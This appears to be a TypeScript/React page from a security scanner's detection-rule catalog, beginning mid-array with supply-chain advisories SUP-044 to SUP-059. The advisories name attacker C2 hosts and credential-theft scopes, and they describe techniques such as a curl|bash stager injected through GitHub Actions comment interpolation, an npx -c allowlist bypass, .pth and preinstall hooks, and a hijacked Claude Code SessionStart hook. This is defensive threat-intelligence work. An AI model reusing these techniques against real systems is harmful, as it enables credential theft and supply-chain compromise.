  { id: "SUP-044", category: "SUP", severity: "BLOCK", title: "elementary-data PyPI/GHCR supply chain compromise via GitHub Actions script injection (April 2026)", description: "elementary-data version 0.23.3 was published to PyPI and ghcr.io/elementary-data/elementary on April 24, 2026 at 22:20 UTC via a GitHub Actions script injection attack. An attacker injected a curl|bash stager into a PR comment body that was unsafely interpolated in a workflow run: block (${{ github.event.comment.body }}), then used the GITHUB_TOKEN to forge a signed release commit and dispatch the legitimate publishing pipeline. The malicious wheel includes elementary.pth — a three-stage credential harvester that auto-executes at every Python start. Stage 3 harvests SSH keys, AWS Secrets Manager/SSM (via live API calls), GCP/Azure credentials, Kubernetes configs, .env files, npm/PyPI tokens, crypto wallets, and exfiltrates them as trin.tar.gz to igotnofriendsonlineorirl-imgonnakmslmao.skyhanni.cloud. The :latest Docker tag on GHCR is also compromised. Downgrade to elementary-data==0.23.2, pin container images by digest, and rotate all credentials on affected hosts.", tags: ["pypi", "ghcr", "github-actions", "script-injection", "elementary-data", "credential-theft", "pth-hook"] },
  { id: "SUP-045", category: "SUP", severity: "BLOCK", title: "GPT-Proxy backdoor: kube-health-tools (npm) / kube-node-health (PyPI) Chinese LLM relay (April 2026)", description: "Both kube-health-tools (npm) and kube-node-health (PyPI) are malicious packages disclosed on April 22, 2026 by Aikido Security. They install a two-stage Zig-compiled binary masquerading as `node-health-check --mode=daemon` that proxies attacker-supplied OpenAI-compatible API calls (/v1/chat/completions, /v1/completions, /v1/models) through the victim host as a Chinese LLM relay. Stage 2 is fetched from `github.com/gibunxi4201/kube-node-diag/releases/download/v2.0/` and written to `/tmp/.kh`. The C2 server is `sync.geeker.indevs.in`. No CVE assigned. Uninstall both packages immediately, audit `/tmp/.kh` and `/tmp/.ns`, kill any process matching `node-health-check --mode=daemon`, and rotate any LLM API keys the host can access.", tags: ["npm", "pypi", "llm-relay", "gpt-proxy", "chinese-relay", "kube-health-tools", "kube-node-health"] },
  { id: "SUP-046", category: "SUP", severity: "BLOCK", title: "Contagious Interview cross-ecosystem supply chain — April 2026 wave (DPRK/UNC1069, apachelicense.vercel.app C2, npm/PyPI/Go/Rust)", description: "North Korean threat cluster UNC1069 (Contagious Interview / Sapphire Sleet / Stardust Chollima) published 1,700+ malicious packages across npm, PyPI, Go Modules, crates.io, and Packagist by April 2026. Affected npm packages include dev-log-core, logger-base, logkitx, pino-debugger, debug-fmt, and debug-glitz; PyPI packages include logutilkit, apachelicense, fluxhttp, and license-utils-kit. All packages send an HTTP POST to https://apachelicense.vercel.app/getAddress?platform=<platform> to retrieve a download URL, fetch ecw_update.zip, and extract it to a hardcoded temp directory (410BB449A-72C6-4500-9765-ACD04JBV827V32V). The payload is a cross-platform RAT/infostealer. Staging infrastructure: logkit.onrender.com, logkit-tau.vercel.app. Remove all listed packages, rotate credentials, and report to your security team.", tags: ["dprk", "unc1069", "contagious-interview", "sapphire-sleet", "npm", "pypi", "rat", "infostealer"] },
  { id: "SUP-047", category: "SUP", severity: "BLOCK", title: "Upsonic MCP STDIO allowlist bypass via npx -c command injection (CVE-2026-30625)", description: "CVE-2026-30625 is an MCP STDIO allowlist bypass in Upsonic 0.71.6. The app allowlists commands like \"npx\" but does not validate arguments. Attackers bypass the allowlist using \"npx -c <arbitrary_command>\" — npx passes the allowlist but its -c flag executes arbitrary shell commands. This second-generation MCP STDIO attack defeats first-generation allowlist defenses. Upgrade Upsonic past 0.71.6 and implement argument-level validation.", tags: ["cve-2026-30625", "upsonic", "mcp", "stdio", "allowlist-bypass", "npx"] },
  { id: "SUP-048", category: "SUP", severity: "BLOCK", title: "PyTorch Lightning Mini Shai-Hulud supply chain compromise (lightning 2.6.2–2.6.3, C2: zero.masscan.cloud)", description: "Two malicious versions of the PyTorch Lightning framework (PyPI package \"lightning\") — 2.6.2 and 2.6.3 — were published on 2026-04-30 and flagged 18 minutes later by Socket. The malicious wheel bundles a hidden _runtime directory containing a downloader and heavily obfuscated JavaScript payload that executes automatically on module import. The payload harvests Anthropic API keys, GitHub tokens, AWS/GCP credentials, SSH keys, and environment variables, then exfiltrates them encrypted to C2 domain zero.masscan.cloud:443/v1/telemetry. If the primary channel fails, it falls back to creating a public GitHub repository with description \"A Mini Shai-Hulud has Appeared\" as an exfiltration beacon. Attributed to the Mini Shai-Hulud / TeamPCP threat actor. Uninstall lightning 2.6.2 and 2.6.3, upgrade to 2.6.4 or later, rotate all API keys and cloud credentials, and audit for unexpected GitHub repository creation.", tags: ["pypi", "pytorch-lightning", "mini-shai-hulud", "teampcp", "credential-stealer"] },
  { id: "SUP-049", category: "SUP", severity: "BLOCK", title: "Mini Shai-Hulud SAP CAP npm supply chain compromise (@cap-js/sqlite, @cap-js/postgres, @cap-js/db-service v2.2.2, mbt@1.2.48)", description: "Four SAP CAP ecosystem npm packages were compromised on April 29, 2026 in a Mini Shai-Hulud / TeamPCP supply chain attack: @cap-js/sqlite@2.2.2, @cap-js/postgres@2.2.2, @cap-js/db-service@2.10.1, and mbt@1.2.48. The attack vector was a stolen CircleCI npm token obtained via a malicious draft PR (feat: ci speedup) against SAP/cloud-mta-build-tool that ran in a PR build exposing project secrets. The compromised packages add a preinstall hook (node setup.mjs) that downloads Bun 1.3.13 from GitHub and executes an 11.7 MB obfuscated payload (execution.js, labeled ctf-scramble-v2). The payload harvests GitHub tokens (via gh auth token), npm tokens (.npmrc), AWS/Azure/GCP/Kubernetes secrets, GitHub Actions runner secrets (via /proc memory), Claude config, MCP config, and VPN configs. Stolen data is AES-256-GCM encrypted with RSA-4096 key wrapping and exfiltrated via newly created GitHub repositories with description \"A Mini Shai-Hulud has Appeared\". The malware propagates by pushing .vscode/tasks.json, .vscode/setup.mjs, .claude/execution.js, .claude/setup.mjs, and .claude/settings.json into repositories it can access, using commit author \"claude <claude@users.noreply.github.com>\" and message \"chore: update dependencies\". The malware exits cleanly on Russian-locale systems. If any affected package was installed, rotate ALL secrets immediately: GitHub tokens, npm tokens, cloud provider credentials (AWS/Azure/GCP), Kubernetes service accounts, and CI/CD secrets. Audit GitHub for repositories with description \"A Mini Shai-Hulud has Appeared\" and commits containing \"OhNoWhatsGoingOnWithGitHub\". SAP Security Note 3747787 addresses this incident.", tags: ["npm", "sap", "cap-js", "mini-shai-hulud", "teampcp", "credential-stealer", "bun-runtime"] },
  { id: "SUP-050", category: "SUP", severity: "BLOCK", title: "Compromised PyTorch Lightning version reference (lightning==2.6.2 or 2.6.3, Mini Shai-Hulud)", description: "PyTorch Lightning versions 2.6.2 and 2.6.3 were compromised in a supply chain attack by the Mini Shai-Hulud / TeamPCP threat actor on April 30, 2026. These specific version constraints in pip requirement files detect projects pinned to the malicious releases. Upgrade to lightning 2.6.4 or later, rotate all API keys and cloud credentials if either version was installed, and check for the C2 domain zero.masscan.cloud in network logs.", tags: ["pypi", "pytorch-lightning", "mini-shai-hulud", "teampcp"] },
  { id: "SUP-051", category: "SUP", severity: "BLOCK", title: "dYdX @dydxprotocol/v4-client-js supply chain compromise — wallet stealer + RAT (C2: dydx.priceoracle.site, January 2026)", description: "Four versions of @dydxprotocol/v4-client-js (npm) — 3.4.1, 1.22.1, 1.15.2, and 1.0.31 — and dydx-v4-client 1.1.5post1 (PyPI) were published via compromised dYdX developer credentials and identified by Socket on January 27, 2026. The npm payload injects malicious code into registry.ts that harvests cryptocurrency wallet seed phrases and device fingerprints, exfiltrating them encrypted to dydx.priceoracle.site/v4/price. The PyPI version additionally drops a Remote Access Trojan with command retrieval via dydx.priceoracle.site/py. Remove affected versions, upgrade to a clean release, rotate all wallet seed phrases, API keys, and developer credentials. The C2 domain was subsequently placed on client hold but is retained as a historical IOC.", tags: ["npm", "pypi", "dydx", "wallet-stealer", "rat", "crypto"] },
  { id: "SUP-052", category: "SUP", severity: "BLOCK", title: "node-ipc supply chain compromise via expired maintainer email domain takeover (9.1.6/9.2.3/12.0.1, C2: sh.azurestaticprovider.net)", description: "Three node-ipc versions — 9.1.6, 9.2.3, and 12.0.1 — were published on May 14, 2026 through a compromised maintainer account. The attacker re-registered the dormant maintainer's expired email domain (atlantis-software.net) via Namecheap, triggering a standard npm password-reset flow to gain publish rights. The 80 KB obfuscated payload silently harvests 90+ credential categories (AWS, GCP, Azure, GitHub CLI, Kubernetes, HashiCorp Vault, Claude AI settings, SSH keys, shell history, database passwords) compresses them into a gzip archive, and exfiltrates to sh.azurestaticprovider.net masquerading as Azure infrastructure. A secondary DNS-TXT exfiltration channel overrides the system DNS resolver to 8.8.8.8 to bypass local inspection. The malware does not establish persistence. Remove versions 9.1.6, 9.2.3, and 12.0.1; pin to 9.2.1 or 12.0.0; rotate all credentials, cloud keys, and package registry tokens immediately.", tags: ["npm", "credential-stealer", "dns-exfiltration", "expired-domain-takeover"] },
  { id: "SUP-053", category: "SUP", severity: "BLOCK", title: "npm typosquatting Microsoft AI packages with Claude Code SessionStart hook backdoor (microsoft-applicationinsights-common v3.4.2 / ms-graph-types v2.43.2, C2 207.90.194.2)", description: "Five typosquatting npm packages published by accounts \"superbase\" and \"micresoft\" ship identical 4.5 MB UPX-compressed ELF binaries inside a .claude/ directory. The binaries execute on npm install and, via a hijacked Claude Code SessionStart hook, re-execute on every subsequent Claude Code session start in the affected project. Two confirmed packages — microsoft-applicationinsights-common v3.4.2 (typosquat of @microsoft/applicationinsights-common) and ms-graph-types v2.43.2 (typosquat of @types/microsoft-graph) — track the real packages' current version history to evade loose-range dependency audits. The binary exfiltrates environment variables, home directory contents, git credentials, and /proc/ data to 207.90.194.2:443. VirusTotal flags the binary as Program:Script/Wacapew.A!ml. Do not install unscoped \"microsoft-*\" or \"ms-graph-*\" npm packages; use only @microsoft/applicationinsights-common and @types/microsoft-graph. Check node_modules for a .claude/settings.json SessionStart hook and rotate all credentials.", tags: ["npm", "typosquatting", "claude-code-hooks", "sessionstart-hook", "credential-stealer"] },
  { id: "SUP-054", category: "SUP", severity: "BLOCK", title: "durabletask v1.4.1–1.4.3 PyPI supply chain compromise (TeamPCP wave-4, C2: check.git-service.com, Linux wiper + cloud credential theft, May 19 2026)", description: "Three malicious versions of the durabletask PyPI package (v1.4.1, v1.4.2, v1.4.3) were published by TeamPCP on May 19 2026 and have since been quarantined. The dropper is injected directly into the package Python source files — when any of these versions are installed and imported, the dropper silently fetches rope.pyz from https://check.git-service.com/rope.pyz (domain registered May 16 2026, three days before the attack) and executes it. The second-stage payload is a full-featured infostealer and worm — it deploys a Linux disk wiper, harvests credentials from every major cloud provider, password manager, and developer tool, encrypts results with an attacker RSA public key, and exfiltrates them to C2. Part of TeamPCP wave-4 (same day as the @antv npm compromise covered by MAL-084). Remove durabletask 1.4.1, 1.4.2, or 1.4.3 immediately and downgrade to 1.4.0 or upgrade to 1.4.4 or later. Rotate all cloud credentials (AWS, GCP, Azure), SSH keys, GitHub tokens, and npm tokens on any machine where these versions were installed. Check for /tmp/rope.pyz and related artifacts. Attribution — TeamPCP.", tags: ["pypi", "durabletask", "teampcp", "mini-shai-hulud", "linux-wiper", "credential-stealer"] },
  { id: "SUP-055", category: "SUP", severity: "BLOCK", title: "laravel-lang supply chain poisoning — DebugElevator stealer via git tag rewrite (all tags backdoored 2026-05-22, C2 flipboxstudio.info)", description: "Four widely-used Laravel localization Composer packages were supply-chain poisoned on 2026-05-22 22:32 UTC — laravel-lang/lang, laravel-lang/attributes, laravel-lang/http-statuses, and laravel-lang/actions. An attacker with push access (via a leaked GitHub PAT) rewrote every existing git tag in all four repositories to point at malicious commits containing a src/helpers.php dropper wired into Composer autoload.files — it runs on every PHP request upon install. The dropper fetches a cross-platform DebugElevator credential stealer from https://flipboxstudio.info/payload (flipboxstudio[.]info is a typosquat of the legitimate flipboxstudio.com) and executes it, harvesting AWS keys, GitHub tokens, Slack tokens, Stripe secrets, SSH keys, .env files, JWTs, Kubernetes secrets, Vault tokens, and crypto wallet recovery phrases. Approximately 700 versions across the four packages are affected (10.3M combined installs). There is no safe tagged version — instead, pin each dependency to a commit SHA predating 2026-05-22 22:32 UTC via upstream branch history and refetch with composer update <package>. Run composer clear-cache afterwards. Rotate all credentials on any machine where these packages were installed or updated after 2026-05-22.", tags: ["composer", "php", "laravel", "laravel-lang", "debugelevator", "credential-stealer"] },
  { id: "SUP-056", category: "SUP", severity: "BLOCK", title: "Mini Shai-Hulud 'Here We Go Again' wave — @uipath (65 pkgs), @opensearch-project, Squawk, TanStack/Mistral (170+ pkgs, CVE-2026-45321, TeamPCP, May 11 2026)", description: "On May 11, 2026, TeamPCP launched the largest Mini Shai-Hulud supply chain wave to date, compromising 373 malicious package-version entries across 169 npm package names and multiple PyPI packages (CVE-2026-45321, GHSA-g7cv-rxg3-hmpx). This wave — dubbed \"Shai-Hulud: Here We Go Again\" — hit 42 @tanstack packages, 65 @uipath packages (e.g. @uipath/codedagent-tool@1.0.1), the @opensearch-project/opensearch JavaScript client, @squawk-db/squawk-runner and related Squawk SQL linter packages, mistralai (PyPI), and guardrails-ai (PyPI). The attack vector is the same as prior waves: a preinstall hook (node setup.mjs) downloads the Bun runtime and executes an obfuscated credential harvester. This wave was the first to achieve valid SLSA provenance on malicious packages, bypassing provenance-based supply chain controls. Stolen data includes GitHub tokens, AWS/GCP/Azure credentials, SSH keys, Kubernetes secrets, and AI tool API keys; propagation uses npm/GitHub Actions tokens to republish to every package the victim can write. Beacon repositories carry the description \"Shai-Hulud: Here We Go Again\". Check your lock files for compromised versions, audit git history for unexpected publishes, and rotate all developer credentials immediately if affected packages were installed.", tags: ["npm", "pypi", "mini-shai-hulud", "teampcp", "uipath", "opensearch", "cve-2026-45321"] },
  { id: "SUP-057", category: "SUP", severity: "BLOCK", title: "Checkmarx Jenkins AST Plugin supply chain compromise — malicious version 2026.5.09 (TeamPCP, CVE-2026-33634, May 9–10 2026)", description: "The Checkmarx Jenkins AST Scanner plugin version 2026.5.09 was backdoored by TeamPCP between May 9, 2026 01:25 UTC and May 10, 2026 08:47 UTC (CVE-2026-33634, CVSS 9.4). The malicious build was uploaded to repo.jenkins-ci.org and was live on the Jenkins Marketplace for approximately 31 hours. Any organization that installed this version in an active Jenkins pipeline during the exposure window may have had GitHub tokens, AWS/GCP/Azure credentials, SSH keys, and CI/CD secrets harvested from the build runner and exfiltrated to attacker infrastructure. This is the third Checkmarx supply chain compromise by TeamPCP (following the Checkmarx GitHub Actions and KICS Docker image attacks). Safe version: 2.0.13-829.vc72453fa_1c16 (published December 17, 2025). Check your Jenkins plugin versions immediately and rotate all credentials if 2026.5.09 was installed.", tags: ["jenkins", "checkmarx", "teampcp", "cve-2026-33634", "ci-cd"] },
  { id: "SUP-058", category: "SUP", severity: "BLOCK", title: "Miasma Phantom Gyp wave — @vapi-ai/server-sdk, ai-sdk-ollama, 55 more npm packages via binding.gyp CI/CD credential theft (liuende501, June 3–4 2026)", description: "The Miasma Phantom Gyp wave (June 3–4, 2026) compromised 57 npm packages across 286 malicious versions using the \"Phantom Gyp\" technique: a 157-byte binding.gyp file that forces node-gyp command substitution during npm install, bypassing --ignore-scripts protections entirely. Primary victims include @vapi-ai/server-sdk (408,000+ monthly downloads) and ai-sdk-ollama (120,000+ monthly downloads), along with autotel, awaitly, executable-stories, node-env-resolver, wrangler-deploy, and 50 additional packages in the jagreehal maintainer account. The payload harvests npm, GitHub, AWS, GCP, Azure, Kubernetes, and HashiCorp Vault credentials and self-propagates by republishing poisoned package versions. Stolen credentials are exfiltrated via GitHub dead-drop repositories under account liuende501 (236 repos used). The attack also forges SLSA v1 provenance attestations. If any affected package was installed June 3–4, 2026, rotate all cloud and registry credentials immediately and audit GitHub for repositories owned by liuende501. This is the eighth distinct Shai-Hulud/Miasma wave since September 2025 (TeamPCP lineage).", tags: ["miasma", "phantom-gyp", "vapi-ai", "teampc", "binding-gyp"] },
  { id: "SUP-059", category: "SUP", severity: "BLOCK", title: "Hades Campaign — ensmallen 0.8.101 and 18 bioinformatics PyPI packages via *-setup.pth Bun startup hook (Miasma lineage, June 8 2026)", description: "The Hades Campaign (June 8, 2026) is a PyPI branch of the Miasma/TeamPCP supply-chain lineage that compromised 19 packages (37 malicious wheel artifacts) in the computational biology, bioinformatics, and graph-ML ecosystem. The lead package ensmallen==0.8.101 and 18 co-maintained packages (dynamo-release, spateo-release, coolbox, napari-ufish, ufish, bramin, cmd2func, executor-engine, executor-http, funcdesc, magique, magique-ai, mrbios, nucbox, okite, pantheon-agents, pantheon-toolsets, and others) were compromised via a maintainer-account takeover. Each compromised release ships a *-setup.pth file that auto-executes during Python startup, downloads the Bun JavaScript runtime, and runs an obfuscated payload (_index.js) that harvests GitHub, npm, PyPI, AWS, GCP, Azure, Kubernetes, Vault, SSH keys, Docker credentials, shell histories, .env files, .npmrc, .pypirc, and Claude/MCP configs. Exfiltration uses GitHub dead-drop repositories whose description is set to \"Hades - The End for the Damned\". Uninstall all affected packages immediately, rotate all credentials accessible from the compromised environment, and audit .pth files in site-packages.", tags: ["hades-campaign", "miasma", "teampcp", "bioinformatics", "pypi"] },
// AUTO_SYNC_END: rules array
];

const categoryColors: Record<Category, string> = {
  MAL: "oklch(0.65 0.22 25)",
  ABU: "oklch(0.72 0.19 45)",
  EXF: "oklch(0.60 0.20 320)",
  INJ: "oklch(0.58 0.22 290)",
  CHN: "oklch(0.65 0.18 200)",
  PINJ: "oklch(0.55 0.24 280)",
  SUP: "oklch(0.68 0.16 80)",
  SE: "oklch(0.62 0.20 340)",
  DEF: "oklch(0.60 0.18 240)",
  EXEC: "oklch(0.63 0.20 15)",
  GR: "oklch(0.65 0.15 180)",
  OBF: "oklch(0.58 0.18 270)",
  PSV: "oklch(0.67 0.16 60)",
  CAP: "oklch(0.62 0.20 150)",
  EVASION: "oklch(0.60 0.18 160)",
};

const severityConfig: Record<Severity, { color: string; icon: typeof XCircle; label: string }> = {
  BLOCK: { color: "oklch(0.65 0.22 25)", icon: XCircle, label: "BLOCK" },
  WARN: { color: "oklch(0.72 0.19 45)", icon: AlertTriangle, label: "WARN" },
  INFO: { color: "oklch(0.65 0.18 200)", icon: Info, label: "INFO" },
};

function RuleCard({ rule }: { rule: Rule }) {
  const [expanded, setExpanded] = useState(false);
  const sev = severityConfig[rule.severity];
  const SevIcon = sev.icon;

  return (
    <div
      className="glow-card rounded-xl cursor-pointer transition-all duration-200"
      onClick={() => setExpanded(!expanded)}
    >
      <div className="p-5">
        <div className="flex items-start justify-between gap-4">
          <div className="flex items-start gap-3 flex-1 min-w-0">
            <span
              className="text-xs font-bold px-2 py-1 rounded flex-shrink-0 mt-0.5"
              style={{
                fontFamily: "'JetBrains Mono', monospace",
                background: `${categoryColors[rule.category]} / 0.12`,
                color: categoryColors[rule.category],
                border: `1px solid ${categoryColors[rule.category]} / 0.25`,
              }}
            >
              {rule.id}
            </span>
            <div className="flex-1 min-w-0">
              <h3
                className="text-sm font-semibold mb-1 truncate"
                style={{ fontFamily: "'Space Grotesk', sans-serif", color: "oklch(0.92 0.005 265)" }}
              >
                {rule.title}
              </h3>
              {expanded && (
                <p className="text-sm leading-relaxed mt-2" style={{ color: "oklch(0.60 0.015 265)" }}>
                  {rule.description}
                </p>
              )}
              {expanded && (
                <div className="flex flex-wrap gap-1.5 mt-3">
                  {rule.tags.map((tag) => (
                    <span
                      key={tag}
                      className="text-xs px-2 py-0.5 rounded"
                      style={{
                        background: "oklch(0.20 0.025 265)",
                        color: "oklch(0.55 0.015 265)",
                        fontFamily: "'JetBrains Mono', monospace",
                      }}
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>
          <div className="flex items-center gap-3 flex-shrink-0">
            <div className="flex items-center gap-1.5">
              <SevIcon className="w-3.5 h-3.5" style={{ color: sev.color }} />
              <span
                className="text-xs font-semibold"
                style={{ color: sev.color, fontFamily: "'JetBrains Mono', monospace" }}
              >
                {sev.label}
              </span>
            </div>
            {expanded ? (
              <ChevronUp className="w-4 h-4" style={{ color: "oklch(0.45 0.012 265)" }} />
            ) : (
              <ChevronDown className="w-4 h-4" style={{ color: "oklch(0.45 0.012 265)" }} />
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

export default function Rules() {
  const [search, setSearch] = useState("");
  const [activeCategory, setActiveCategory] = useState<Category | "ALL">("ALL");
  const [activeSeverity, setActiveSeverity] = useState<Severity | "ALL">("ALL");

  const filtered = rules.filter((r) => {
    const matchSearch =
      search === "" ||
      r.id.toLowerCase().includes(search.toLowerCase()) ||
      r.title.toLowerCase().includes(search.toLowerCase()) ||
      r.tags.some((t) => t.includes(search.toLowerCase()));
    const matchCat = activeCategory === "ALL" || r.category === activeCategory;
    const matchSev = activeSeverity === "ALL" || r.severity === activeSeverity;
    return matchSearch && matchCat && matchSev;
  });

  const categories: Array<Category | "ALL"> = ["ALL", "MAL", "ABU", "EXF", "CAP", "CHN", "PINJ", "SUP", "SE", "OBF", "DEF", "INJ", "GR", "EXEC", "PSV"];
  const severities: Array<Severity | "ALL"> = ["ALL", "BLOCK", "WARN", "INFO"];

  return (
    <div className="min-h-screen" style={{ fontFamily: "'Inter', sans-serif" }}>
      <Navbar />

      <div className="pt-24 pb-16">
        <div className="container">
          {/* Header */}
          <div className="mb-12">
            <h1
              className="text-4xl font-bold mb-4"
              style={{ fontFamily: "'Space Grotesk', sans-serif", color: "oklch(0.95 0.005 265)" }}
            >
              Detection Rule Catalog
            </h1>
            <p className="text-lg max-w-2xl" style={{ color: "oklch(0.60 0.015 265)" }}>
              {rules.length} rules covering MCP attacks, prompt injection, data exfiltration, container escape, and more.
              Updated automatically as new threats emerge.
            </p>
            <a
              href="https://github.com/kurtpayne/skillscan-security/blob/main/PATTERN_UPDATES.md"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1.5 mt-3 text-sm transition-colors duration-200"
              style={{ color: "oklch(0.65 0.18 290)" }}
              onMouseEnter={(e) => ((e.currentTarget as HTMLElement).style.color = "oklch(0.78 0.18 290)")}
              onMouseLeave={(e) => ((e.currentTarget as HTMLElement).style.color = "oklch(0.65 0.18 290)")}
            >
              <ExternalLink className="w-3.5 h-3.5" />
              View pattern update history
            </a>
          </div>

          {/* Filters */}
          <div className="flex flex-col gap-4 mb-8">
            {/* Search */}
            <div className="relative max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4" style={{ color: "oklch(0.50 0.015 265)" }} />
              <input
                type="text"
                placeholder="Search rules, IDs, or tags..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full pl-10 pr-4 py-2.5 rounded-lg text-sm outline-none transition-all duration-200"
                style={{
                  background: "oklch(0.16 0.022 265)",
                  border: "1px solid oklch(0.58 0.22 290 / 0.20)",
                  color: "oklch(0.85 0.01 265)",
                  fontFamily: "'Inter', sans-serif",
                }}
                onFocus={(e) => (e.target.style.borderColor = "oklch(0.58 0.22 290 / 0.50)")}
                onBlur={(e) => (e.target.style.borderColor = "oklch(0.58 0.22 290 / 0.20)")}
              />
            </div>

            {/* Category filter */}
            <div className="flex flex-wrap gap-2">
              {categories.map((cat) => (
                <button
                  key={cat}
                  onClick={() => setActiveCategory(cat)}
                  className="px-3 py-1.5 rounded-md text-xs font-semibold transition-all duration-200"
                  style={{
                    fontFamily: "'JetBrains Mono', monospace",
                    background: activeCategory === cat
                      ? cat === "ALL" ? "oklch(0.58 0.22 290)" : `${categoryColors[cat as Category]}`
                      : "oklch(0.18 0.022 265)",
                    color: activeCategory === cat ? "white" : "oklch(0.60 0.015 265)",
                    border: `1px solid ${activeCategory === cat ? "transparent" : "oklch(0.58 0.22 290 / 0.15)"}`,
                  }}
                >
                  {cat}
                </button>
              ))}
              <div className="w-px mx-1" style={{ background: "oklch(0.58 0.22 290 / 0.15)" }} />
              {severities.map((sev) => (
                <button
                  key={sev}
                  onClick={() => setActiveSeverity(sev)}
                  className="px-3 py-1.5 rounded-md text-xs font-semibold transition-all duration-200"
                  style={{
                    fontFamily: "'JetBrains Mono', monospace",
                    background: activeSeverity === sev
                      ? sev === "ALL" ? "oklch(0.58 0.22 290)" : severityConfig[sev as Severity]?.color || "oklch(0.58 0.22 290)"
                      : "oklch(0.18 0.022 265)",
                    color: activeSeverity === sev ? "white" : "oklch(0.60 0.015 265)",
                    border: `1px solid ${activeSeverity === sev ? "transparent" : "oklch(0.58 0.22 290 / 0.15)"}`,
                  }}
                >
                  {sev}
                </button>
              ))}
            </div>
          </div>

          {/* Category legend */}
          <details className="mb-6 group">
            <summary
              className="cursor-pointer text-xs font-semibold uppercase tracking-widest select-none inline-flex items-center gap-1.5 transition-colors duration-200"
              style={{ color: "oklch(0.55 0.015 265)", fontFamily: "'JetBrains Mono', monospace" }}
            >
              <ChevronDown className="w-3.5 h-3.5 transition-transform group-open:rotate-180" />
              Rule prefix legend
            </summary>
            <div className="mt-3 flex flex-wrap gap-x-6 gap-y-1.5 text-xs" style={{ color: "oklch(0.65 0.015 265)" }}>
              {([
                ["MAL", "Malware patterns"],
                ["EXF", "Exfiltration"],
                ["PINJ", "Prompt / pipeline injection"],
                ["ABU", "Instruction abuse"],
                ["CHN", "Chain detection (co-occurrence)"],
                ["SUP", "Supply chain"],
                ["SE", "Social engineering"],
                ["DEF", "Defense evasion"],
                ["EXEC", "Execution hijack"],
                ["OBF", "Obfuscation"],
                ["PSV", "Permission scope violation"],
                ["GR", "Graph analysis"],
                ["IOC", "Threat intelligence"],
                ["DEP", "Dependency vulnerability"],
                ["BIN", "Binary artifact"],
                ["AST", "AST data-flow"],
                ["CAP", "Capability laundering"],
                ["EVASION", "Evasion techniques"],
              ] as const).map(([prefix, label]) => (
                <span key={prefix} className="inline-flex items-center gap-1.5 py-0.5">
                  <span
                    className="font-bold px-1.5 py-0.5 rounded"
                    style={{
                      fontFamily: "'JetBrains Mono', monospace",
                      background: `${categoryColors[prefix as Category] ?? "oklch(0.55 0.015 265)"} / 0.12`,
                      color: categoryColors[prefix as Category] ?? "oklch(0.55 0.015 265)",
                    }}
                  >
                    {prefix}
                  </span>
                  <span>{label}</span>
                </span>
              ))}
            </div>
          </details>

          {/* Results count */}
          <p className="text-sm mb-5" style={{ color: "oklch(0.50 0.015 265)" }}>
            Showing {filtered.length} of {rules.length} rules
          </p>

          {/* Rule list */}
          <div className="space-y-3">
            {filtered.length === 0 ? (
              <div className="text-center py-16" style={{ color: "oklch(0.50 0.015 265)" }}>
                No rules match your search. Try a different query.
              </div>
            ) : (
              filtered.map((rule) => <RuleCard key={rule.id} rule={rule} />)
            )}
          </div>

          {/* Note about full catalog */}
          <div
            className="mt-10 p-5 rounded-xl text-sm"
            style={{
              background: "oklch(0.16 0.022 265 / 0.5)",
              border: "1px solid oklch(0.58 0.22 290 / 0.15)",
              color: "oklch(0.55 0.015 265)",
            }}
          >
            This catalog shows all {rules.length} named rules (static + chain). The full rulepack ships with the package and is updated automatically.{" "}
            <a
              href="https://github.com/kurtpayne/skillscan-security/blob/main/src/skillscan/data/rules/default.yaml"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1 transition-colors duration-200"
              style={{ color: "oklch(0.65 0.18 290)" }}
              onMouseEnter={(e) => ((e.currentTarget as HTMLElement).style.color = "oklch(0.78 0.18 290)")}
              onMouseLeave={(e) => ((e.currentTarget as HTMLElement).style.color = "oklch(0.65 0.18 290)")}
            >
              View the full YAML rulepack on GitHub
              <ExternalLink className="w-3 h-3" />
            </a>
          </div>

        </div>
      </div>

      <Footer />
    </div>
  );
}
